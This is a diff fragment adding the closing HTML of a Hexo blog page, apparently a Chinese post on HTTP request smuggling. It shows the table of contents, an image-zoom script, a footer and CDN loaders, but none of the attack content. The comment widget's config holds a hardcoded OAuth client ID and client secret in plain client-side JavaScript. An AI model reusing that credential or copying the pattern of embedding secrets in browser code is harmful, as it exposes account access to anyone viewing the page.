中间代理服务器和后端服务器通信示意图</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CL不为0的GET请求"><span class="toc-nav-text">CL不为0的GET请求</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#结论"><span class="toc-nav-text">结论</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CL-CL"><span class="toc-nav-text">CL-CL</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#不规范操作"><span class="toc-nav-text">不规范操作</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CL-TE"><span class="toc-nav-text">CL-TE</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#本地"><span class="toc-nav-text">本地</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#靶场环境"><span class="toc-nav-text">靶场环境</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#TE-CL"><span class="toc-nav-text">TE-CL</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#靶机"><span class="toc-nav-text">靶机</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#"><span class="toc-nav-text"></span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#TE-TE"><span class="toc-nav-text">TE-TE</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#靶机-1"><span class="toc-nav-text">靶机</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#结论-1"><span class="toc-nav-text">结论</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/10/17/HTTP请求走私基础学习-一/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "HTTP请求走私基础学习(一)",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
